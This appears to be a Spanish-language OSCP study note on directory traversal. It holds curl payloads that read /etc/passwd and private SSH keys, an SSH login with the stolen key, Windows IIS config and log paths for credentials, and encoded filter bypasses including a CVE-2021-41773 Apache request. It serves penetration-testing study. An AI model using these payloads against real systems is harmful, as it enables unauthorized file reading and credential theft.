---
tipo: tecnica
fase: explotacion
so: 
tags: [oscp, tecnica, explotacion, web]
fecha: 2026-09-28
---

# Directory Traversal

> [!abstract] Qué es y cuándo usarla
> También *path traversal*. Leer ficheros **fuera del web root** abusando de un parámetro que apunta a un fichero y no sanea el input. Solo **lee** contenido (no ejecuta). Sirve para robar claves SSH, configs, logs → a veces acceso al sistema. Probar en cualquier `?page=`, `?file=`, `?lang=`, `?doc=`.

## Requisitos previos
- Un parámetro que cargue un fichero (revisar enlaces, botones, source).
- curl o Burp (no el navegador: reformatea la salida).

## Identificación
Un enlace da mucha info: `https://site/cms/login.php?language=en.html`
- `.php` → lenguaje · `language=en.html` → carga un fichero (probar acceder directo) · `cms/` → subdirectorio del web root.

## Explotación (Linux)
```bash
curl "http://target/meteor/index.php?page=../../../../../../../../../etc/passwd"
curl "http://target/meteor/index.php?page=../../../../../../../../../home/USER/.ssh/id_rsa"
```
`/etc/passwd` revela usuarios y **home dirs** → buscar `~/.ssh/id_rsa`. Guardar la clave y conectar:
```bash
chmod 400 dt_key                       # ssh exige permisos restrictivos
ssh -i dt_key -p 2222 user@target
```

## Windows
```
../../../../../../../../../Windows/System32/drivers/etc/hosts   # fichero de prueba (legible por todos)
..\..\..\..\Windows\System32\drivers\etc\hosts                  # probar backslash también
```
- No hay `/etc/passwd`+SSH → más difícil escalar. Investigar rutas por servicio:
  - IIS logs: `C:\inetpub\logs\LogFiles\W3SVC1\`
  - IIS config (creds): `C:\inetpub\wwwroot\web.config`

## Bypass de filtros con encoding
Si `../` está filtrado (servidor/WAF/app), codificar con **URL encoding** (`.` = `%2e`, `/` = `%2f`):
```bash
curl "http://target/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"   # CVE-2021-41773 (Apache 2.4.49)
```
Otras variantes a probar: doble encoding (`%252e`), `....//`, mezclar `\` y `/` en Windows.

> [!warning] Detección / problemas
> - `../` es un patrón muy conocido → suele estar filtrado en texto plano; el encoding lo evade porque el filtro no lo reconoce pero el servidor sí lo decodifica.
> - El navegador rompe/formatea la salida (ej. una clave SSH) → usa curl/Burp.
> - Sobran `../` una vez llegas a `/`; añade muchos si no sabes el cwd.

## Directory Traversal vs File Inclusion
Traversal **solo lee**; si el parámetro **incluye** el fichero en el código en ejecución, es [[File Inclusion (LFI-RFI)]] y puede dar **RCE**.

## Visto en
- Módulo: [[09 - Common Web Application Attacks]]
- Cheatsheet: [[Web]]
- Máquinas: [[]]
